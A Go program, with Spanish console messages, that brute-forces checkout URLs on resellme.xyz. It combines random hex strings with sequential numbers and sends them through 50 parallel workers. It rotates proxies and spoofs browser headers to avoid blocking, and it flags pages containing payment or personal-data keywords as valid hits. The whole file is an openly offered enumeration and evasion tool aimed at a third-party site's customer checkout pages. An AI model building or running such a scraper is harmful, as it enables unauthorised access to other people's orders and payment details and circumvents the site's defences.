package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"
)

type Config struct {
    ApiKey      string `json:"api_key"`
    BearerToken string `json:"bearer_token"`
}

var appConfig Config

const (
    ColorReset  = "\033[0m"
    ColorRed    = "\033[31m"
    ColorGreen  = "\033[32m"
    ColorYellow = "\033[33m"
    ColorCyan   = "\033[36m"
    ColorWhite  = "\033[97m"
)

var (
    validCount   int
    invalidCount int
    retries      int
    mu           sync.Mutex
)

type Job struct {
    Link string
}

func main() {
    rand.Seed(time.Now().UnixNano())
    startTime := time.Now()

    loadConfig()
    proxies, _ := loadLines("proxies.txt")
    if len(proxies) == 0 {
        fmt.Println(string(ColorYellow), "[!] MODO SIN PROXY: Usando tu IP real. Cuidado con el bloqueo.", string(ColorReset))
    } else {
        fmt.Printf("%s[*] %d proxies cargados.%s\n", ColorCyan, len(proxies), ColorReset)
    }

    jobs := make(chan Job, 2000)
    var wg sync.WaitGroup

    numWorkers := 50
    fmt.Printf("%s[*] Iniciando %d Workers...%s\n", ColorCyan, numWorkers, ColorReset)
    for i := 0; i < numWorkers; i++ {
        wg.Add(1)
        go worker(jobs, &wg, proxies)
    }

    go linkGenerator(jobs)
    go uiManager(startTime)

    wg.Wait()
}

// ----------------------- Generador de links -----------------------
func linkGenerator(jobs chan<- Job) {
    baseURL := "https://resellme.xyz/checkout/"
    currentNum := int64(1000000000000)

    for {
        id2 := fmt.Sprintf("%013d", currentNum)
        id1 := randomHex(13)
        fullLink := fmt.Sprintf("%s%s-%s", baseURL, id1, id2)

        jobs <- Job{Link: fullLink}
        currentNum++
        if currentNum > 1999999999999 {
            currentNum = 1000000000000
        }
    }
}

// ----------------------- Worker -----------------------
func worker(jobs <-chan Job, wg *sync.WaitGroup, proxies []string) {
    defer wg.Done()
    for job := range jobs {
        checkLink(job.Link, proxies)
    }
}

// ----------------------- Chequeo de link -----------------------
func checkLink(link string, proxies []string) {
    transport := &http.Transport{}
    if len(proxies) > 0 {
        proxyStr := proxies[rand.Intn(len(proxies))]
        proxyURL, err := url.Parse(proxyStr)
        if err == nil {
            transport.Proxy = http.ProxyURL(proxyURL)
        }
    }

    client := &http.Client{
        Timeout:   10 * time.Second,
        Transport: transport,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }

    req, err := http.NewRequest("GET", link, nil)
    if err != nil {
        return
    }

    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "es-ES,es;q=0.9,en;q=0.8")
    req.Header.Set("Referer", "https://resellme.xyz/")
    
    if appConfig.ApiKey != "" {
        req.Header.Set("Authorization", "Bearer "+appConfig.ApiKey)
    }

    resp, err := client.Do(req)
    if err != nil {
        printResult(link, "RETRY", "Network Error")
        return
    }
    defer resp.Body.Close()

    bodyBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        printResult(link, "RETRY", "Read Error")
        return
    }
    bodyString := string(bodyBytes)

    if resp.StatusCode == 200 {
        validKeywords := []string{
            "checkout", "pagar", "comprar", "tarjeta", "paypal", "bitcoin",
            "moneda", "cantidad", "total", "enviar", "confirmar", "datos de pago",
            "metodo de pago", "procesar pago", "resellme", "factura", "producto",
            "servicio", "precio", "impuesto", "descuento", "cupon", "usuario",
            "cliente", "email", "telefono", "direccion", "pais", "ciudad",
            "codigo postal", "nombre", "apellido", "empresa", "nit", "documento",
            "terminos", "condiciones", "politica", "privacidad", "seguridad",
            "certificado", "ssl", "https", "lock", "escudo", "proteger", "seguro",
            "garantia", "devolucion", "reembolso", "soporte", "ayuda", "contacto",
        }

        found := false
        lowerBody := strings.ToLower(bodyString)
        for _, kw := range validKeywords {
            if strings.Contains(lowerBody, kw) {
                found = true
                break
            }
        }

        if found {
            printResult(link, "VALID", "Keyword match")
        } else {
            printResult(link, "INVALID", "No match")
        }
    } else {
        printResult(link, "INVALID", fmt.Sprintf("HTTP %d", resp.StatusCode))
    }
}

// ----------------------- Funciones auxiliares -----------------------
func loadConfig() {
    f, err := os.Open("config.json")
    if err != nil {
        return
    }
    defer f.Close()
    json.NewDecoder(f).Decode(&appConfig)
}

func loadLines(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" {
            lines = append(lines, line)
        }
    }
    return lines, scanner.Err()
}

func printResult(link, status, msg string) {
    mu.Lock()
    defer mu.Unlock()
    switch status {
    case "VALID":
        validCount++
        fmt.Printf("%s[VALID]%s %s - %s\n", ColorGreen, ColorReset, link, msg)
    case "INVALID":
        invalidCount++
        fmt.Printf("%s[INVALID]%s %s - %s\n", ColorRed, ColorReset, link, msg)
    case "RETRY":
        retries++
        fmt.Printf("%s[RETRY]%s %s - %s\n", ColorYellow, ColorReset, link, msg)
    }
}

func randomHex(n int) string {
    letters := "0123456789abcdef"
    result := make([]byte, n)
    for i := range result {
        result[i] = letters[rand.Intn(len(letters))]
    }
    return string(result)
}

func uiManager(start time.Time) {
    for {
        mu.Lock()
        v := validCount
        iv := invalidCount
        r := retries
        mu.Unlock()
        elapsed := time.Since(start).Truncate(time.Second)
        fmt.Printf("%s[STATS]%s V:%d | I:%d | R:%d | Tiempo: %s\n", ColorCyan, ColorReset, v, iv, r, elapsed)
        time.Sleep(5 * time.Second)
    }
}
